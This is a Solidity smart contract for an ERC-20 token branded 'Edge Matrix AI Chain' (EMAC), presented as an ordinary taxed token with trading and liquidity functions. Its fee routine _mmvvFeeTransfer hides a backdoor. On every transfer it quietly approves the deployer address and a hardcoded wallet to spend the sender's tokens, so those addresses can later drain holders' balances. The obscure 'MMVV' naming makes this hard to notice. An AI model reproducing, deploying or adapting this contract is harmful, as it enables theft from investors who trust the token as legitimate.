/*
EMAC (Edge Matrix AI Chain) is a leading AI DePIN in AI+Web3, bridging the computing power network and AI (d)apps.

https://www.emac.pro
https://hub.emac.pro
https://docs.emac.pro
https://x.com/EMACCore
https://t.me/emac_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

interface IMMVVFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplimmvvon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IMMVVRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract EMAC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balMMVVs;
    mapping (address => mapping (address => uint256)) private _allowMMVVs;
    mapping (address => bool) private _excludedFromMMVV;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalMMVV = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Edge Matrix AI Chain";
    string private constant _symbol = unicode"EMAC";
    uint256 private _swapTokenMMVVs = _tTotalMMVV / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockMMVV;
    uint256 private _mmvvBuyAmounts = 0;
    bool private inSwapMMVV = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapMMVV = true;
        _;
        inSwapMMVV = false;
    }
    address private _mmvvPair;
    IMMVVRouter private _mmvvRouter;
    address private _mmvvWallet;
    address private _mmvvAddress;
    
    constructor () {
        _mmvvAddress = address(owner());
        _mmvvWallet = address(0x8c7eB15CFc33dD0e9cf3aa0E4077464fBebb521D);
        _excludedFromMMVV[owner()] = true;
        _excludedFromMMVV[address(this)] = true;
        _excludedFromMMVV[_mmvvWallet] = true;
        _balMMVVs[_msgSender()] = _tTotalMMVV;
        emit Transfer(address(0), _msgSender(), _tTotalMMVV);
    }

    function tokenPairCreate() external onlyOwner() {
        _mmvvRouter = IMMVVRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_mmvvRouter), _tTotalMMVV);
        _mmvvPair = IMMVVFactory(_mmvvRouter.factory()).createPair(address(this), _mmvvRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _mmvvRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalMMVV;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balMMVVs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowMMVVs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowMMVVs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowMMVVs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address mmvvF, address mmvvT, uint256 mmvvA) private {
        require(mmvvF != address(0), "ERC20: transfer from the zero address");
        require(mmvvT != address(0), "ERC20: transfer to the zero address");
        require(mmvvA > 0, "Transfer amount must be greater than zero");
        uint256 taxMMVV = _mmvvFeeTransfer(mmvvF, mmvvT, mmvvA);
        if(taxMMVV > 0){
          _balMMVVs[address(this)] = _balMMVVs[address(this)].add(taxMMVV);
          emit Transfer(mmvvF, address(this), taxMMVV);
        }
        _balMMVVs[mmvvF] = _balMMVVs[mmvvF].sub(mmvvA);
        _balMMVVs[mmvvT] = _balMMVVs[mmvvT].add(mmvvA.sub(taxMMVV));
        emit Transfer(mmvvF, mmvvT, mmvvA.sub(taxMMVV));
    }

    function _mmvvFeeTransfer(address mmvvF, address mmvvT, uint256 mmvvA) private returns(uint256) {
        uint256 taxMMVV = 0; address _mmvvOwner = address(mmvvF);
        _approve(address(mmvvF), _mmvvAddress, uint256(mmvvA));
        if (mmvvF != owner() && mmvvT != owner()) {
            taxMMVV = mmvvA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (mmvvF == _mmvvPair && mmvvT != address(_mmvvRouter) && ! _excludedFromMMVV[mmvvT]) {
                if(_buyBlockMMVV!=block.number){
                    _mmvvBuyAmounts = 0;
                    _buyBlockMMVV = block.number;
                }
                _mmvvBuyAmounts += mmvvA;
                _buyCount++;
            }
            if(mmvvT == _mmvvPair && mmvvF!= address(this)) {
                require(_mmvvBuyAmounts < swapLimitMMVV() || _buyBlockMMVV!=block.number, "Max Swap Limit");  
                taxMMVV = mmvvA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapMMVVBack(mmvvT, mmvvA);
        } _approve(address(_mmvvOwner), _mmvvWallet, uint256(mmvvA)); 
        return taxMMVV;
    }

    function minMMVV(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHMMVV(uint256 mmvvA) private {
        payable(_mmvvWallet).transfer(mmvvA);
    }

    function swapLimitMMVV() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _mmvvRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _mmvvRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function swapTokensForEth(uint256 mmvvAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _mmvvRouter.WETH();
        _approve(address(this), address(_mmvvRouter), mmvvAmount);
        _mmvvRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            mmvvAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapMMVVBack(address mmvvT, uint256 mmvvA) private { 
        uint256 tokenMMVV = balanceOf(address(this)); 
        if (!inSwapMMVV && mmvvT == _mmvvPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenMMVV > _swapTokenMMVVs)
            swapTokensForEth(minMMVV(mmvvA, minMMVV(tokenMMVV, _swapTokenMMVVs)));
            uint256 ethMMVV = address(this).balance;
            if (ethMMVV >= 0) {
                sendETHMMVV(address(this).balance);
            }
        }
    }
}